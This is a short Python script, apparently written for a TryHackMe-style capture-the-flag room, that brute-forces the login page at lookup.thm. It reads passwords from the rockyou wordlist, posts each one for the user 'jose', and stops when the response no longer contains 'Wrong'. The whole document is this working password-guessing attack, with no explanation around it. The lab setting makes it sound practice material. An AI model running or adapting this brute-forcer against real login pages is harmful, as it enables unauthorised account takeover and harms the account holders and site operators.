import requests


password_file = "/usr/share/wordlists/rockyou.txt"
# account = "admin"
account = "jose"
target = "http://lookup.thm/login.php"

with open(password_file, "r") as fh:
    for line in fh:
        passwd = line.strip()
        payload = {"username": account, "password": passwd}

        req = requests.post(target, data=payload)

        if "Wrong" in req.text:
            print(f"{passwd} is incorrect")
        else:
            print(f"SUCCESS. \nUsername: {account} \nPassword: {passwd}")
            # print(req.text)
            break
